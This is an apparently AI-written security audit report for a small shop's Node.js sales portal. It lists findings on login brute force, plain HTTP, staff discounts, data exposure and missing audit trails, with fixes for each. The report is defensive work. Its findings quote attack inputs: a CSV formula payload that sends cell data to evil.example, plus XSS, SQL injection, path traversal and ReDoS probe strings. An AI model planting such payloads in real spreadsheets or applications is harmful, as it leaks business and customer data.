# Security Audit Report — Small Shop Portal

| | |
|---|---|
| **Date** | 2026-11-12 |
| **Scope** | Entire application in `D:\Small shop` (server, database layer, front end, import/export modules, configuration) |
| **Environment tested** | Throwaway local copy only: `http://127.0.0.1:4013` with its own empty database. Real shop data (`data/shop.db`) was **not** read, modified or used. |
| **Method** | Full source review + safe, non-destructive dynamic tests (scripted HTTP probes, browser checks, Excel/PDF engine checks). No denial-of-service testing, no external systems, no real payments. |
| **Status** | Findings only. **No code has been changed.** Remediation awaits your approval (see §9). |

---

## 1. Overall assessment

The application has a **sound core**: every protected API route enforces authentication and role checks **on the server**; all database queries use bound parameters (no SQL injection); output is consistently HTML-escaped (no XSS found in 20+ views and dialogs); there is no path traversal; passwords are hashed with scrypt and a per-user salt; session cookies are `HttpOnly` + `SameSite=Strict`; and there are **zero third-party dependencies**, which removes supply-chain risk.

The weaknesses are mainly in **account protection, insider/financial controls and deployment hardening**, which matter for a shop where cashiers handle money and the portal runs on a shared network:

- Passwords can be guessed without limit, and each guess briefly freezes the server.
- Traffic, including passwords and session cookies, is sent unencrypted over the shop network.
- A cashier can sell anything at a **100% discount**, can read cost prices and customer ID numbers through the API, and can plant a formula that runs when the owner opens an export in Excel.
- Payments and expenses can be **deleted without a trace**, and there is no record of who changed prices or settings.

| Severity | Count | Confirmed | Potential |
|---|---|---|---|
| CRITICAL | 0 | – | – |
| HIGH | 3 | 3 | 0 |
| MEDIUM | 5 | 5 | 0 |
| LOW | 8 | 7 | 1 |
| INFO | 4 | – | – |

**No CRITICAL findings.** No path was found for an outsider without credentials to read data or gain access, **except** two scenarios that depend on deployment: an un-initialised install (M1) and someone listening on the network (H2).

---

## 2. Reconnaissance summary

| Area | Finding |
|---|---|
| Stack | Node.js 26 `node:http` server (`server.js`), built-in `node:sqlite` (`db.js`), vanilla JS single-page front end (`public/`), in-house XLSX/PDF modules (`lib/`). |
| Dependencies | None (`package.json` has no `dependencies`); only Node built-ins are `require`d. No CDN or external URLs in the front end. |
| Data | SQLite file `data/shop.db` (WAL). Money stored as integer cents. Tables: users, sessions, settings, products, stock_movements, sales, sale_items, customers, customer_payments, suppliers, purchases, supplier_payments, expenses. |
| Auth | Username + password → random 256-bit session token in `sid` cookie (`HttpOnly; SameSite=Strict; Path=/; Max-Age=7d`), stored in `sessions` table. |
| Roles | `admin` (owner) and `staff` (cashier). Route access levels: `public`, `user` (any signed-in), `admin`. |
| Admin area | Same SPA; admin pages hidden in UI for staff **and** enforced server-side (verified). |
| File handling | Upload: product import (`.xlsx`/`.csv`, ≤5 MB, admin only, parsed in memory, never written to disk). Downloads: CSV/XLSX/PDF generated in memory. Static files served only from `public/`. |
| Payments | No payment provider, webhooks or card data. "Payments" are internal ledger entries (customer/supplier payments). |
| Config | `PORT`, `DATA_DIR` env vars. No secrets/keys exist. Server listens on **all network interfaces** over **plain HTTP**. |
| Tests | No existing automated test suite in the project. |

---

## 3. Findings

### HIGH

#### H1 — No brute-force protection on login; each attempt blocks the whole server
- **Severity:** HIGH · **Status:** Confirmed
- **Location:** `server.js:186-192` (`POST /api/login`), `server.js:26-34` (`hashPassword` uses `crypto.scryptSync`)
- **Endpoint:** `POST /api/login` (also `POST /api/password`, `POST /api/setup`)
- **Explanation:** There is no limit on failed attempts per account or per IP, no delay and no lockout. Password hashing uses the *synchronous* `scryptSync`, which blocks Node's single thread for about 65–70 ms per attempt, so a stream of login attempts also stalls every other user (including the till).
- **Exploitation:** Anyone on the network runs a password-guessing script against `owner` or a cashier account. Weak or reused passwords fall quickly. Because the password policy is only "8+ characters" (L7), common passwords such as `password1` are allowed.
- **Business impact:** Full takeover of the owner account means access to all financial data, customer records, deleting payments and changing prices. A login flood also slows the till.
- **Evidence:** 30 consecutive wrong passwords for `cashier` were all answered `401`, with no lockout. The correct password was then accepted immediately (`200`). Average time per attempt was 72 ms (blocking). *(Test §5 in `sectest.mjs`.)*
- **Fix:**
  1. Count failed attempts per username and per client IP in memory. After 5 failures, require an increasing wait (for example 1 s, 2 s, 4 s … up to 15 min) and return `429`.
  2. Switch to async `crypto.scrypt` so hashing never blocks other requests.
  3. Cap password length at 256 characters before hashing.
- **Verify:** 6 wrong attempts return `429` with `Retry-After`; the correct password is refused during the lockout and accepted afterwards; other users' requests stay fast during a login burst.

#### H2 — Unencrypted HTTP on the shop network; server reachable on every interface
- **Severity:** HIGH (MEDIUM if the PC is on a private, cabled network used only by staff) · **Status:** Confirmed (configuration)
- **Location:** `server.js:1500` (`server.listen(PORT)`, binds 0.0.0.0/::), `server.js:153` (cookie without `Secure`)
- **Explanation:** The portal is designed to be used from tablets and phones over Wi-Fi. All traffic, including the login password and the `sid` session cookie, travels in clear text. The server accepts connections on every network the PC is joined to.
- **Exploitation:** Anyone on the same Wi-Fi (for example customer Wi-Fi sharing the router) can capture traffic passively, read the password or session cookie, and replay the cookie to act as the owner. If the laptop joins public Wi-Fi, the portal is exposed there too.
- **Business impact:** Account takeover without guessing; exposure of customers' personal data and the shop's finances.
- **Evidence:** Responses carry no `Strict-Transport-Security`; the cookie is `sid=…; HttpOnly; SameSite=Strict; Path=/; Max-Age=604800` with no `Secure` flag; the only listener is HTTP. *(Test §14.)* Sniffing itself was not performed (not needed, and it would involve real network traffic).
- **Fix:**
  - Add optional HTTPS: if `TLS_CERT`/`TLS_KEY` files are configured, serve HTTPS, mark the cookie `Secure` and send HSTS. Document how to create a local certificate.
  - Add a `HOST` setting. The default stays LAN-reachable, since that's how the shop uses it, but it can be set to `127.0.0.1` for single-PC use.
  - Document: put the portal PC on the staff network only, never customer Wi-Fi.
- **Verify:** With certificates configured, `https://` works, plain HTTP isn't served on the same port, the cookie has `Secure`, and HSTS is present. With `HOST=127.0.0.1`, other devices can't connect.

#### H3 — Staff can apply unlimited discounts (up to 100%) with no approval
- **Severity:** HIGH (business-logic / financial manipulation) · **Status:** Confirmed
- **Location:** `server.js:725-760` (`POST /api/sales`; discount validated only as 0–100% or ≤ subtotal)
- **Endpoint:** `POST /api/sales` (access: any signed-in user)
- **Explanation:** The server correctly ignores price overrides from staff (`server.js:755`), but applies **any** discount a cashier sends. A 100% discount, or a money discount equal to the subtotal, is accepted. Stock is removed and nothing flags it.
- **Exploitation:** A cashier rings up goods for a friend at 100% off, or sells for cash and records it with a large discount, pocketing the difference.
- **Business impact:** Direct, hard-to-spot inventory and cash loss. Discounts only show up as a total on the P&L.
- **Evidence:** Signed in as `cashier`, posted a sale of 3 units with `discount: 100, discount_type: "percent"`. Response `200 {"total_cents":0}`. *(Test §4.)*
- **Fix:**
  - Add a setting **"Maximum staff discount %"** (for example default 10%). The server rejects staff sales whose discount exceeds it, whether given as % or money; admins are unlimited.
  - Record the discount and cashier on the sale (already stored) and add a **Discounts** filter or report so the owner can review them.
- **Verify:** A staff sale with 11% discount gets `400`; with 10% gets `200`; an admin sale with 100% gets `200`. The money-equivalent check also works.

### MEDIUM

#### M1 — First-run setup can be claimed by anyone who reaches the server first
- **Severity:** MEDIUM · **Status:** Confirmed
- **Location:** `server.js:168-184` (`GET/POST /api/setup`, public)
- **Explanation:** While no user exists, any visitor can create the admin account. This is fine on a PC nobody else can reach, but the server listens on the whole network (H2). A new install, a new `DATA_DIR`, or a deleted database reopens this window.
- **Exploitation:** Someone on the network opens the portal before the owner and becomes the admin.
- **Business impact:** Full control of a new installation.
- **Evidence:** On the fresh test database, an unauthenticated `POST /api/setup` returned `200` and an admin session. After setup it correctly returns `403 Setup already completed`. *(Tests §1, §1b, §1c.)* Your live database already has an owner, so it is **not** currently exploitable there.
- **Fix:** Allow setup only from the local machine (`127.0.0.1`/`::1`), **or** require a one-time setup code that the server prints to its console at start.
- **Verify:** Setup from another device or IP gets `403`; setup from the PC itself (or with the printed code) succeeds.

#### M2 — Sessions are not revoked when a password is changed or reset
- **Severity:** MEDIUM · **Status:** Confirmed
- **Location:** `server.js:203-211` (`POST /api/password`), `server.js:258-262` (admin reset in `PUT /api/users/:id`)
- **Explanation:** Changing a password leaves every existing session valid for up to 7 days. Only disabling a user deletes their sessions.
- **Exploitation:** The owner suspects a cashier knows their password and changes it, or resets a staff password after a phone is lost. Whoever holds the old session keeps full access for up to a week.
- **Business impact:** Password change gives a false sense of recovery after a compromise.
- **Evidence:** A staff session stayed valid (`GET /api/me → 200`) after the admin reset that staff password. A second admin session also stayed valid after the admin changed their own password. *(Tests §7a, §7b.)*
- **Fix:** On password change, delete all of the user's other sessions (keep the current one). On admin reset, delete all of the target user's sessions. Optionally add a **"Sign out everywhere"** button.
- **Verify:** Repeat §7a/§7b: the old sessions get `401`.

#### M3 — Staff can read cost prices, profit and customers' personal data through the API
- **Severity:** MEDIUM (excessive data exposure) · **Status:** Confirmed
- **Location:** `server.js:279` (`GET /api/products`), `server.js:629-639` (`GET /api/inventory/movements`), `server.js:715-722` (`GET /api/sales/:id`), `server.js:855-863` (`GET /api/customers`)
- **Explanation:** The staff screens hide costs and customer details, but the API returns them in full to any signed-in user. Hiding something in the UI is not access control.
- **Exploitation:** A cashier opens the browser developer tools (or uses `curl` with their cookie) and downloads every product's cost and margin, supplier names and costs, and every credit customer's phone, email, address, **national ID number** and notes.
- **Business impact:** Leak of commercially sensitive pricing; privacy and legal exposure for customer ID numbers.
- **Evidence:** As `cashier`: `product.cost_cents=400`; customer objects include `phone, email, address, id_number, notes, credit_limit_cents, balance_cents`; `sale.cogs_cents=400`; purchase movements include `unit_cost_cents` and `supplier`. *(Test §3.)*
- **Fix:** Filter responses by role. For staff:
  - Products: no `cost_cents`.
  - Sales: no `cogs_cents` or item `cost_cents`.
  - Movements: no `unit_cost_cents` or `supplier`.
  - Customers: only `id, name, phone (masked), balance_cents, credit_limit_cents`, which is what the till needs.
- **Verify:** Repeat §3 as staff: those fields are absent. The admin still sees them, and the till's credit check still works.

#### M4 — CSV formula injection in exports (a cashier can plant it)
- **Severity:** MEDIUM · **Status:** Confirmed in Microsoft Excel 16
- **Location:** `server.js:122-128` (`csv()` only *quotes* values starting with `= + - @`; quoting does not stop Excel from evaluating them); free-text customer name accepted from any user at `server.js:779`
- **Endpoints:** `GET /api/export/sales.csv|expenses.csv|products.csv`, `GET /api/customers/:id/statement.csv`, `GET /api/suppliers/:id/statement.csv`
- **Explanation:** Text fields such as customer, product and supplier names, notes and descriptions are written to CSV without neutralising formulas. Excel runs `=…` cells when the file is opened. Staff can't use the new dropdown to type a customer name, but the API still accepts a free-text `customer` on `POST /api/sales`.
- **Exploitation:** A cashier sends a sale with customer `=HYPERLINK("https://evil.example/?d="&A1,"Invoice")`. When the owner exports sales to CSV for the accountant, Excel shows a convincing link that can leak cell data, or lure the owner to a phishing page. More dangerous `DDE`-style payloads are blocked by default in modern Excel, but older or misconfigured installs are at risk.
- **Business impact:** Phishing or data leakage targeting the owner or accountant.
- **Evidence:** A customer name `=HYPERLINK("http://example.invalid","Click")` was exported as `"=HYPERLINK(""http://example.invalid"",""Click"")"`. Excel opened the CSV and reported `HasFormula=True`, showing the clickable link "Click". A **staff** session posting `customer: "=HYPERLINK(…/staff…)"` produced a row in the owner's sales CSV. *(Test §9 + Excel COM check.)* The `.xlsx` and PDF exports are **not** affected: they write inline strings, never formulas (`lib/xlsx.js` `sheetXml`).
- **Fix:**
  - In `csv()`, prefix any value starting with `= + - @`, Tab or CR with an apostrophe `'`, and keep the quoting.
  - Stop accepting free-text `customer` from staff on `POST /api/sales`: use registered customers or "Walk-in" only.
- **Verify:** Re-export and open in Excel: `HasFormula=False`, and the text displays literally.

#### M5 — No audit trail; financial records can be deleted without a trace
- **Severity:** MEDIUM (insider fraud / repudiation) · **Status:** Confirmed
- **Location:** hard deletes at `server.js:907` (customer payments), `server.js:1102` (supplier payments), `server.js:1257` (expenses). Unlogged changes: product price/cost edits `server.js:313`, settings `server.js:214`, user/role changes `server.js:248`, sale void records no voider on the sale `server.js:804`. No audit table in `db.js`.
- **Explanation:** Admin actions aren't logged. Deleted payments and expenses vanish completely; the CUST/SUPP number gap is the only hint.
- **Exploitation:** Anyone with admin access (a second admin, or a compromised owner session; see H1, H2, M2) deletes a customer's recorded payment to re-bill them, removes expenses, or quietly changes prices. Afterwards nobody can tell who did it or when.
- **Business impact:** Undetectable fraud, disputes with customers and suppliers, unreliable books.
- **Evidence:** After `DELETE /api/customers/1/payments/:pid`, the statement showed 0 payments (was 1), and the schema has no audit table. *(Test §13.)*
- **Fix:**
  - Add an append-only `audit_log` table (who, when, action, entity, before/after JSON). Write to it for logins (success/fail), user and role changes, settings, product price/cost changes, voids, payments, deletions and imports.
  - Replace payment/expense **deletion** with **reversal** (mark as reversed, with the reason and user, kept on the statement), or at least soft-delete plus audit.
  - Add an admin-only **Activity log** page.
- **Verify:** Each action creates one audit row with the correct user. Deleting (reversing) a payment keeps it visible as "reversed" on the statement, and the balance is still correct.

### LOW

#### L1 — Username enumeration via response timing
- **Status:** Confirmed · **Location:** `server.js:187-188`
- **Explanation:** For unknown usernames the server skips password hashing, so it answers in about 1 ms instead of about 64 ms.
- **Exploitation:** An attacker finds valid usernames first, then focuses guessing on them (H1).
- **Evidence:** Median response was 64 ms for existing user `cashier` vs 1 ms for `nobody_here_123`. *(Test §6.)*
- **Fix:** Hash against a dummy salt/hash when the user doesn't exist, so every failed login costs the same.
- **Verify:** Medians differ by less than ~10 ms.

#### L2 — CSRF protection relies only on `SameSite=Strict`; Content-Type not enforced
- **Status:** Confirmed (no working cross-site exploit; same-site only) · **Location:** `server.js:52-60` (`readBody` parses any content type), `server.js:461-505` (import accepts any body)
- **Explanation:** `SameSite=Strict` blocks other *sites*. However, every web app served from the same host on another port (for example another tool on `localhost:8080`, or a printer or router UI at the same IP) counts as the **same site**, and its pages can send requests carrying the portal cookie. Since `text/plain` bodies are accepted, an ordinary HTML form on such a page could post to the portal without any CORS preflight.
- **Evidence:** `POST /api/expenses` with `Content-Type: text/plain` returned `200`, and `POST /api/products/import?commit=1` with a `text/plain` CSV body imported a product. *(Tests §8a, §8b.)*
- **Fix:** Require `Content-Type: application/json` on JSON endpoints (`415` otherwise), and `application/octet-stream` on import. Also require a custom header (for example `X-Requested-With: shop-portal`) on all state-changing requests, which browsers can't send cross-origin without a CORS preflight. Check `Origin` when it is present.
- **Verify:** A `text/plain` POST gets `415`, and a POST without the custom header gets `403`. The app itself still works.

#### L3 — Malformed cookie or URL crashes request handling (HTTP 500)
- **Status:** Confirmed · **Location:** `server.js:76` (`decodeURIComponent` in `parseCookies`), `server.js:1487` (route params)
- **Explanation:** `decodeURIComponent` throws on bad percent-encoding. Cookies on `localhost` are shared by **all ports**, so another local app that sets a cookie like `x=%zz` makes **every** portal API request fail for that browser.
- **Evidence:** A valid session plus another cookie `other_app=%zz` gave `500 Something went wrong`; `/api/sales/%E0%A4%A` gave `500`. *(Test §10.)*
- **Fix:** Wrap decoding in try/catch (ignore bad cookies, return `400` for bad paths), and only read the `sid` cookie.
- **Verify:** Both probes return `200` / `400` instead of `500`.

#### L4 — No upper bounds on money and quantity values
- **Status:** Confirmed (admin-only input) · **Location:** `server.js:96-100` (`money`), `server.js:89-93` (`int`)
- **Explanation:** Values like `1e17` are accepted. The resulting cents (`1e19`) exceed JavaScript's safe-integer range, so totals and reports silently become wrong.
- **Evidence:** A product with price `1e17` was accepted and returned `price_cents = 10000000000000000000`, which fails `isSafeInteger`. *(Test §12.)*
- **Fix:** Cap money at, for example, 1,000,000,000.00 and quantities at 1,000,000. Reject anything that isn't a safe integer after conversion.
- **Verify:** `1e17` gets `400`; normal values still work.

#### L5 — `limit` query parameter not validated
- **Status:** Confirmed · **Location:** `server.js:631`, `server.js:637` (value interpolated into `LIMIT ${limit}`)
- **Explanation:** It isn't injectable, since it is coerced with `Number()`, but `limit=-1` returns **all** rows (SQLite treats a negative LIMIT as unlimited), and `limit=0.5` causes a 500 error.
- **Evidence:** `limit=-1 → 200 (all rows)`, `limit=0.5 → 500`, with a datatype-mismatch stack trace in the server log. *(Test §10.)*
- **Fix:** `limit = int(limit, { min: 1, max: 1000 })`, defaulting to 200.
- **Verify:** Both return `400`, or are clamped.

#### L6 — Session tokens stored in plain text; no idle timeout
- **Status:** Confirmed (code) · **Location:** `db.js:25-29` (`sessions.token` stored raw), `server.js:146-154`
- **Explanation:** Anyone who obtains a copy of `shop.db` (a backup, a shared folder, a stolen USB stick) can take over any active session for up to 7 days. Sessions also never expire from inactivity.
- **Fix:** Store `SHA-256(token)` and look it up by hash. Add an idle timeout (for example 12 h) and refresh `expires_at` on use. Consider a shorter session for admins.
- **Verify:** The `sessions` table holds hashes only; an idle session expires.

#### L7 — Weak password policy; no MFA for the owner account
- **Status:** Confirmed (code) · **Location:** `server.js:176`, `server.js:207`, `server.js:234`, `server.js:259` (only `length ≥ 8`)
- **Explanation:** `password`, `12345678` and `shopshop` are all accepted, and there is no second factor for the admin.
- **Fix:**
  - Reject the most common passwords (a small built-in list) and passwords equal to the username or shop name. Cap length at 256 characters.
  - Optional (larger change): TOTP two-step verification for admins.
- **Verify:** `12345678` is rejected; a strong passphrase is accepted.

#### L8 — Regular expression built from uploaded file content (XLSX import)
- **Status:** **Potential** (not tested; it would require DoS-style testing) · **Location:** `lib/xlsx.js:131-132`
- **Explanation:** The sheet relationship id (`r:id`) read from the uploaded workbook is inserted into `new RegExp(...)` without escaping. A crafted file could make the regex invalid (a handled 400 error) or pathologically slow (ReDoS), briefly freezing the server. Only admins can upload, which limits the risk.
- **Fix:** Escape the id (`rid.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')`), or parse the relationships with a fixed regex and compare ids as plain strings.
- **Verify:** A unit test with `r:id="(a+)+$"` parses quickly or is rejected cleanly.

### INFO / passed checks

| # | Area | Result |
|---|---|---|
| I1 | **Authorization** | All 43 non-public routes return `401` without a session; all 32 admin routes return `403` for staff (full matrix in §5). No route relies only on hidden UI buttons. |
| I2 | **SQL injection** | All queries use bound parameters. Probes (`' OR 1=1--` in dates, ids, login) were rejected with `400`/`401`. Dynamic SQL fragments are constants only (plus L5's numeric limit). |
| I3 | **XSS (stored/reflected/DOM)** | Payload `<img src=x onerror=…>` stored in the shop name, product name and category, customer name and notes, supplier name and contact, payment method and note, and expense category and description. It was rendered on 11 pages plus tabs, sale details, the printed receipt, payment receipts, edit dialogs, the delivery view and the till search: **0 executions, 0 injected elements**. All shown as text. URL hash values are only used as numbers. |
| I4 | **Path traversal / file exposure** | `/../server.js`, `%2e%2e`, `%5c`, `/../data/shop.db` and `/.claude/launch.json` all return the SPA page, never the file. `data/` is outside `public/`. No directory listing. |
| I5 | **Mass assignment / role manipulation** | Unknown role values become `staff`; staff can't change their own role (`role` field ignored on `/api/password`); admins can't demote or disable themselves. |
| I6 | **Financial integrity** | Totals, tax and cost of goods are computed on the server from database prices. Staff price overrides are ignored (`server.js:755`). Stock and credit-limit checks run inside `BEGIN IMMEDIATE` transactions. Negative amounts and quantities are rejected. Payment references are unique and never reused. |
| I7 | **Password storage** | scrypt (N=16384, r=8, p=1), 16-byte random salt per user, constant-time compare. Acceptable; OWASP's current suggestion is N≥2^17 (consider raising when doing H1). |
| I8 | **Session handling** | 256-bit random tokens; a new token at every login (no session fixation); logout deletes the session server-side; the cookie is `HttpOnly` and `SameSite=Strict`; no tokens in localStorage or sessionStorage. |
| I9 | **Error handling** | Unexpected errors return a generic `500 Something went wrong`; stack traces go only to the server console. No `Server`/`X-Powered-By` headers. |
| I10 | **Payments / webhooks** | No external payment provider, card data, webhooks or API keys, so Phase 8 webhook and signature checks are not applicable. |
| I11 | **Security headers** | `X-Content-Type-Options: nosniff` only on static files. **Missing:** `Content-Security-Policy`, `X-Frame-Options` / `frame-ancestors`, `Referrer-Policy`, `Permissions-Policy`, and `nosniff` on API responses. Clickjacking from *other sites* is largely blocked because `SameSite=Strict` cookies aren't sent in cross-site frames, but same-site pages (L2) could frame the portal. **Recommended as defence-in-depth (LOW).** |
| I12 | **Data at rest** | `data/shop.db` holds customer ID numbers, phones and addresses unencrypted, readable by any Windows user account on the PC, and copied as-is in backups. Protect the PC account and encrypt backups (for example BitLocker or encrypted zip). |
| I13 | **Account recovery** | No self-service password reset, so there are no reset-token weaknesses. If the only owner forgets their password there is no recovery path (availability risk). Consider keeping a second admin account. |

---

## 4. Critical and high-risk lists

- **Critical:** none.
- **High:** H1 (no login brute-force protection and blocking hash), H2 (plain HTTP on the shop network), H3 (unlimited staff discounts).

## 5. API endpoint security inventory

Probed with no session (anon) and as `staff`. Expected: `401` for anon on non-public routes, `403` for staff on admin routes. `400` means the request reached validation (authorised; empty test body). **All rows match their intended access level.** Column "Notes" lists findings that apply.

| Method | Path | Access | Anon | Staff | Notes |
|---|---|---|---|---|---|
| GET | /api/setup | public | 200 | 200 | M1 |
| POST | /api/setup | public | 200* | – | M1 (*fresh DB only; 403 after setup) |
| POST | /api/login | public | 401 | 401 | H1, L1, L7 |
| POST | /api/logout | public | 200 | 200 | – |
| GET | /api/me | user | 401 | 200 | L3 |
| POST | /api/password | user | 401 | 400 | M2, L7 |
| PUT | /api/settings | admin | 401 | 403 | M5 |
| GET | /api/users | admin | 401 | 403 | – |
| POST | /api/users | admin | 401 | 403 | L7, M5 |
| PUT | /api/users/:id | admin | 401 | 403 | M2, M5 |
| GET | /api/products | user | 401 | 200 | **M3** (cost) |
| POST | /api/products | admin | 401 | 403 | L4 |
| PUT | /api/products/:id | admin | 401 | 403 | L4, M5 |
| POST | /api/products/import | admin | 401 | 403 | L2, L8 |
| GET | /api/products/import-template.xlsx | admin | 401 | 403 | – |
| POST | /api/export/pdf | user | 401 | 400 | – (renders only data sent by the caller) |
| POST | /api/export/xlsx | user | 401 | 400 | – (inline strings; no formulas) |
| GET | /api/inventory/movements | user | 401 | 200 | **M3** (cost, supplier), L5 |
| POST | /api/inventory/restock | admin | 401 | 403 | L4 |
| POST | /api/inventory/adjust | admin | 401 | 403 | M5 |
| GET | /api/sales | user | 401 | 200 | by design (staff see sales) |
| GET | /api/sales/:id | user | 401 | 200 | **M3** (cogs) |
| POST | /api/sales | user | 401 | 400 | **H3**, M4 (free-text customer) |
| POST | /api/sales/:id/void | admin | 401 | 403 | M5 |
| GET | /api/customers | user | 401 | 200 | **M3** (PII incl. ID numbers) |
| GET | /api/customers/:id | admin | 401 | 403 | – |
| POST/PUT | /api/customers[/:id] | admin | 401 | 403 | – |
| POST | /api/customers/:id/payments | admin | 401 | 403 | M5 |
| DELETE | /api/customers/:id/payments/:pid | admin | 401 | 403 | **M5** (hard delete) |
| GET | /api/customers/:id/statement[.csv] | admin | 401 | 403 | M4 (csv) |
| GET/POST/PUT | /api/suppliers[/:id] | admin | 401 | 403 | – |
| POST | /api/suppliers/:id/payments | admin | 401 | 403 | M5 |
| DELETE | /api/suppliers/:id/payments/:pid | admin | 401 | 403 | **M5** |
| GET | /api/purchases/:id | admin | 401 | 403 | – |
| GET | /api/suppliers/:id/statement[.csv] | admin | 401 | 403 | M4 (csv) |
| GET/POST | /api/expenses | admin | 401 | 403 | – |
| DELETE | /api/expenses/:id | admin | 401 | 403 | **M5** |
| GET | /api/reports/pl | admin | 401 | 403 | – |
| GET | /api/reports/dashboard | user | 401 | 200 | staff view omits profit (verified in code) |
| GET | /api/export/:name (csv) | admin | 401 | 403 | **M4** |
| GET | /* (static) | public | 200 | 200 | I4 passed; I11 headers |

## 6. Database security assessment

- **Injection:** none found (I2).
- **Access:** SQLite runs inside the app process; there is no network database port and no credentials to leak. Access is limited to the PC's file system. The `data/` folder is excluded from Git and never served over HTTP.
- **Sensitive data:** customer national ID numbers, phones and addresses are stored in plain text (I12). Session tokens are stored in plain text (L6). Password hashes are scrypt (I7).
- **Integrity:** integer cents; transactions for sales, restocks, voids and payment numbering. There are no upper bounds on values (L4) and financial rows can be hard-deleted (M5).
- **Error handling:** database errors are hidden from clients (generic 500), but L5 shows an unvalidated parameter reaching SQLite.
- **Backups:** not automated; manual copies of the `data` folder are unencrypted (I12).

## 7. Authentication and authorization assessment

- **Authorization: strong.** Enforced per route on the server, deny-by-default for non-public routes, verified for every endpoint and both roles. The one gap is *what* staff-accessible endpoints return (M3), not *whether* they can be reached.
- **Authentication: needs hardening.** Hashing and session generation are sound. Missing: attempt limiting (H1), timing-safe failure path (L1), session revocation on password change (M2), transport encryption (H2), a stronger password policy and MFA (L7), and a protected first-run setup (M1).

## 8. Dependency audit results

- `package.json` declares **no dependencies or devDependencies**. The code `require`s only `node:` built-ins and local files.
- `npm audit` cannot run (no lockfile), and there is nothing to audit. **No known-vulnerable packages.**
- Runtime: Node.js v26.13.0 (current). Keep Node updated, since it is the only external component.
- Secret scan (API keys, tokens, passwords in code, config and docs): **none found**. No external URLs or CDNs in the front end.
- Not run: OWASP ZAP. It isn't installed, and installing new tools was out of scope for this pass. The scripted probes in `sectest.mjs` cover the same checks for this API surface; ZAP can be added later if you want a second opinion.

## 9. Remediation plan (awaiting your approval)

| Priority | Item | Effort | Notes |
|---|---|---|---|
| **1 — Immediate** | H1 login throttling + async scrypt + password length cap | S | |
| 1 | H3 "Maximum staff discount %" setting enforced on the server | S | Default 10%; owner can change it |
| 1 | M2 revoke sessions on password change/reset (+ "Sign out everywhere") | S | |
| 1 | M1 lock first-run setup to the local PC | S | |
| 1 | M4 neutralise formulas in CSV + remove free-text customer for staff | S | |
| **2 — Next** | M3 role-based response filtering for staff | M | Till keeps working (uses only name/balance) |
| 2 | M5 audit log table + Activity page; payments/expenses become **reversals** instead of deletions | M–L | Changes how "delete payment" looks: it shows as reversed |
| 2 | H2 optional HTTPS (cert files), `Secure` cookie + HSTS, `HOST` setting, docs | M | Needs a certificate generated on the PC; browsers will warn for self-signed certificates unless trusted |
| 2 | I11 security headers (CSP, frame-ancestors, Referrer-Policy, nosniff on API) | S | |
| **3 — Hardening** | L1 constant-time failed login | S | |
| 3 | L2 require JSON/octet-stream content types + custom request header | S | |
| 3 | L3 tolerant cookie/URL decoding | S | |
| 3 | L4 upper bounds on money/quantities; L5 validate `limit` | S | |
| 3 | L6 hash session tokens + idle timeout | S | Everyone is signed out once when deployed |
| 3 | L7 common-password check (+ optional TOTP for admins later) | S / L | TOTP is a separate, larger feature |
| 3 | L8 escape regex input in XLSX reader | S | |

After approval I will: implement the approved items; add a `npm test` security regression suite (built-in `node:test`, no new dependencies) that replays the probes above; re-run every test from this report; and write `SECURITY_REMEDIATION_REPORT.md`.

## 10. Limitations

- Testing used a throwaway copy on `127.0.0.1`. Network sniffing (H2) was not performed; that finding is based on configuration evidence.
- No denial-of-service or load testing (per your rules). The blocking-hash issue (H1) and the regex issue (L8) are based on code and timing evidence only.
- OWASP ZAP and other external scanners were not installed (no new tools without approval).
- There was no existing test suite to run.
- The browser checks used Chromium in the app's preview pane. CSV formula behaviour was verified in Microsoft Excel 16 on this PC. Other spreadsheet programs may behave differently.

*Test script and raw results (throwaway data only): `sectest.mjs` and `sectest-results.txt` in the session scratchpad.*
